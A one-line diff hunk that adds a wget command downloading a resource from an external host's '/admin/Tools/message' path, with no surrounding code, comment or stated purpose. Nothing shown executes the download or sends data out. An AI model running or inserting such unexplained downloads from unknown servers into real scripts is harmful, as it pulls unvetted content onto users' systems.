@@ -1,0 +1,1 @@
+wget https://denemephp.nigtas.com/admin/Tools/message
